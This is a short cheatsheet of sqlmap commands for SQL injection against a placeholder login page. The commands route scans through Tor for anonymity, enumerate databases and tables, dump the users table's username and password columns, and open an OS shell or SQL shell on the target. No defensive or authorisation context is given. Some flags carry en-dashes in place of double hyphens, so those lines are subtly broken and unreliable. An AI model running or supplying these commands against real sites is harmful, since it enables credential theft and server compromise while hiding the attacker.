## SQLMap Cheatsheet

#### Easy Scanning option

> sqlmap -u "http://testsite.com/login.php"

#### Scanning by using tor

> sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5

#### Scanning by manually setting the return time

> sqlmap -u "http://testsite.com/login.php" --time-sec 15

#### List all databases at the site

> sqlmap -u "http://testsite.com/login.php" --dbs

#### List all tables in a specific database

> sqlmap -u "http://testsite.com/login.php" -D site_db --tables

#### Dump the contents of a DB table

> sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump

#### List all columns in a table

> sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns

#### Dump only selected columns

> sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump

#### Dump a table from a database when you have admin credentials

> sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump

#### Get OS Shell

> sqlmap --dbms=mysql -u "http://testsite.com/login.php" --os-shell

#### Get SQL Shell

> sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell
